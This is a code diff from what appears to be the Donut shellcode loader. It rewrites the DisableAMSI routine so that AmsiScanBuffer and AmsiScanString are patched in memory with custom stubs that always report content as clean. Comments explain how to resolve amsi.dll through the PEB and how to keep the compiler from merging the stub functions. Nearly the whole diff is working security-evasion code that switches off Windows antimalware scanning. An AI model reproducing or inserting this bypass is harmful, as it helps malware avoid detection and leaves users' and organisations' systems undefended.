@@ -33,35 +33,87 @@
 
 
 #if defined(BYPASS_AMSI_A)
-// Custom AMSI bypass
+
+// Custom stub that returns S_OK and *result = AMSI_RESULT_CLEAN
+// We force noinline to prevent the compiler from merging this with other functions
+__declspec(noinline)
+HRESULT WINAPI CustomAmsiScanBuffer(
+    HAMSICONTEXT amsiContext,
+    PVOID buffer,
+    ULONG length,
+    LPCWSTR contentName,
+    HAMSISESSION amsiSession,
+    AMSI_RESULT *result)
+{
+    // Set result to CLEAN (0)
+    if(result != NULL) {
+        *result = AMSI_RESULT_CLEAN;
+    }
+    return S_OK;
+}
+
+// Dummy end function to calculate stub length
+// The body MUST differ from other functions or MSVC will deduplicate it
+__declspec(noinline)
+int CustomAmsiScanBufferEnd(int x, int y, int z) {
+    return (x ^ y) + (z * 3);
+}
+
+// Same for AmsiScanString
+__declspec(noinline)
+HRESULT WINAPI CustomAmsiScanString(
+    HAMSICONTEXT amsiContext,
+    LPCWSTR string,
+    LPCWSTR contentName,
+    HAMSISESSION amsiSession,
+    AMSI_RESULT *result)
+{
+    if(result != NULL) {
+        *result = AMSI_RESULT_CLEAN;
+    }
+    return S_OK;
+}
+
+__declspec(noinline)
+int CustomAmsiScanStringEnd(int x, int y) {
+    return (x | 0x41) - y;
+}
+
 BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     HMODULE dll;
+    DWORD len, op, t;
     LPVOID cs;
-    DWORD op, t;
-    
-    // Patch bytes: mov eax, 0x80070057 ; ret
-    // This makes AmsiScanBuffer return "invalid parameter" instead of scanning
-    // Replace this with your own custom patch bytes
-    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    
-    // Try to get a handle to amsi.dll
+
+    // Resolve amsi.dll via PEB (does NOT call LoadLibraryA)
     dll = xGetLibAddress(inst, inst->amsi);
-    if(dll == NULL) return TRUE;  // AMSI not present, nothing to do
-    
-    // Get address of AmsiScanBuffer
+    if(dll == NULL) return TRUE;  // Not present = nothing to do
+
+    // --- Patch AmsiScanBuffer ---
     cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
-    if(cs == NULL) return FALSE;  // Should exist, fail if not found
-    
-    // Make the memory writable
-    if(!inst->api.VirtualProtect(cs, sizeof(patch), PAGE_EXECUTE_READWRITE, &op))
+    if(cs == NULL) return FALSE;
+
+    len = (ULONG_PTR)CustomAmsiScanBufferEnd - (ULONG_PTR)CustomAmsiScanBuffer;
+    if((int)len <= 0) return FALSE;  // Compiler reordered functions
+
+    if(!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
         return FALSE;
-    
-    // Copy our patch over the real function
-    Memcpy(cs, patch, sizeof(patch));
-    
-    // Restore original memory protection
-    inst->api.VirtualProtect(cs, sizeof(patch), op, &t);
-    
+
+    Memcpy(cs, ADR(PCHAR, CustomAmsiScanBuffer), len);
+    inst->api.VirtualProtect(cs, len, op, &t);
+
+    // --- Patch AmsiScanString ---
+    cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
+    if(cs == NULL) return FALSE;
+
+    len = (ULONG_PTR)CustomAmsiScanStringEnd - (ULONG_PTR)CustomAmsiScanString;
+    if((int)len <= 0) return FALSE;
+
+    if(!inst->api.VirtualProtect(cs, len, PAGE_EXECUTE_READWRITE, &op))
+        return FALSE;
+
+    Memcpy(cs, ADR(PCHAR, CustomAmsiScanString), len);
+    inst->api.VirtualProtect(cs, len, op, &t);
+
     return TRUE;
 }
 #endif
